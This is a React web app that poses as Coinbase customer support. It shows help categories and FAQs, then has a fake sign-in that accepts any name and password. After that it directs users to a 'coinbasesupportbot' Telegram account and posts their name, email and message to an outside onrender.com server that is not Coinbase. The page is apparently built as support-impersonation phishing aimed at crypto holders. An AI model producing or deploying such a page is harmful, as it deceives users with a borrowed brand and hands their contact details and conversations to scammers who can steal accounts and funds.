import React, { useState } from "react";
import ReactDOM from "react-dom/client";

function App() {
  const [showLogin, setShowLogin] = useState(false);
  const [loggedIn, setLoggedIn] = useState(false);
  const [name, setName] = useState("");
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [message, setMessage] = useState("");
  const [sent, setSent] = useState(false);

  const handleLogin = () => {
    if (name && password) setLoggedIn(true);
  };

  const sendEmail = async () => {
    if (!email || !message) return;
    await fetch("https://coinbase-chat-api.onrender.com/send-support-message", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name, email, message })
    });
    setSent(true);
    setTimeout(() => setSent(false), 3000);
    setEmail(""); setMessage("");
  };

  const categories = [
    { title: "Payments", icon: "💳" },
    { title: "Account", icon: "👤" },
    { title: "Security", icon: "🔒" },
    { title: "Verification", icon: "✅" },
    { title: "Limits & Fees", icon: "📊" }
  ];

  const faqs = [
    "How do I recover my account?",
    "What is the Coinbase refund policy?",
    "How do I reset my password?",
    "How to protect against phishing?"
  ];

  return (
    <div style={wrapper}>
      {!showLogin ? (
        <>
          <h1 style={{ fontSize: 32, marginBottom: 10 }}>Find answers to your questions</h1>
          <p style={{ color: "#cbd5e1", marginBottom: 30 }}>Search help topics or browse categories below.</p>

          <div style={catGrid}>
            {categories.map((cat, i) => (
              <div key={i} style={catCard}>
                <div style={{ fontSize: 32 }}>{cat.icon}</div>
                <div>{cat.title}</div>
              </div>
            ))}
          </div>

          <div style={policyBox}>
            <h3>Our support team will never ask for your password or 2-step verification codes.</h3>
            <p>We’re here to help you stay safe and secure while using Coinbase.</p>
          </div>

          <div style={faqBox}>
            <h3>Common questions</h3>
            <ul style={{ paddingLeft: 0 }}>
              {faqs.map((q, i) => (
                <li key={i} style={{ marginBottom: 10, listStyle: "none" }}>🔹 {q}</li>
              ))}
            </ul>
          </div>

          <button style={buttonStyle} onClick={() => setShowLogin(true)}>Sign in to speak with us</button>
        </>
      ) : !loggedIn ? (
        <div style={box}>
          <h2>Log in to Support</h2>
          <input style={inputStyle} placeholder="Your name" value={name} onChange={(e) => setName(e.target.value)} />
          <input type="password" style={inputStyle} placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
          <button style={buttonStyle} onClick={handleLogin}>Log in</button>
        </div>
      ) : (
        <div style={box}>
          <h2>Welcome, {name}</h2>
          <a href="https://t.me/coinbasesupportbot" target="_blank" rel="noreferrer" style={linkButton}>
            💬 Contact us via Telegram
          </a>
          <p style={{ marginTop: 30 }}>Or send us a message via email:</p>
          <input style={inputStyle} placeholder="Your email" value={email} onChange={(e) => setEmail(e.target.value)} />
          <textarea rows="4" style={{ ...inputStyle, height: "100px" }} placeholder="Message" value={message} onChange={(e) => setMessage(e.target.value)} />
          <button style={buttonStyle} onClick={sendEmail}>📨 Send Message</button>
          {sent && <p style={{ color: "lightgreen" }}>✅ Message sent!</p>}
        </div>
      )}
    </div>
  );
}

const wrapper = {
  maxWidth: 800,
  margin: "0 auto",
  padding: 20,
  textAlign: "center"
};

const catGrid = {
  display: "grid",
  gridTemplateColumns: "repeat(auto-fit, minmax(120px, 1fr))",
  gap: 20,
  marginBottom: 40
};

const catCard = {
  background: "#1e293b",
  padding: 20,
  borderRadius: 10,
  color: "#f1f5f9",
  fontWeight: 600,
  fontSize: 16
};

const box = {
  background: "#1e293b",
  padding: 30,
  borderRadius: 12,
  textAlign: "center"
};

const policyBox = {
  background: "#1e293b",
  padding: 20,
  borderRadius: 10,
  marginBottom: 40,
  textAlign: "left"
};

const faqBox = {
  background: "#0f172a",
  padding: 20,
  borderRadius: 10,
  marginBottom: 40,
  textAlign: "left"
};

const inputStyle = {
  width: "100%",
  padding: "12px",
  borderRadius: "8px",
  backgroundColor: "#0f172a",
  border: "1px solid #334155",
  color: "#f8fafc",
  marginBottom: "10px",
  fontSize: "16px"
};

const buttonStyle = {
  backgroundColor: "#3b82f6",
  color: "#fff",
  padding: "12px 20px",
  border: "none",
  borderRadius: "8px",
  fontSize: "16px",
  cursor: "pointer"
};

const linkButton = {
  ...buttonStyle,
  display: "block",
  width: "100%",
  marginTop: "20px",
  textDecoration: "none",
  textAlign: "center"
};

ReactDOM.createRoot(document.getElementById("root")).render(<App />);
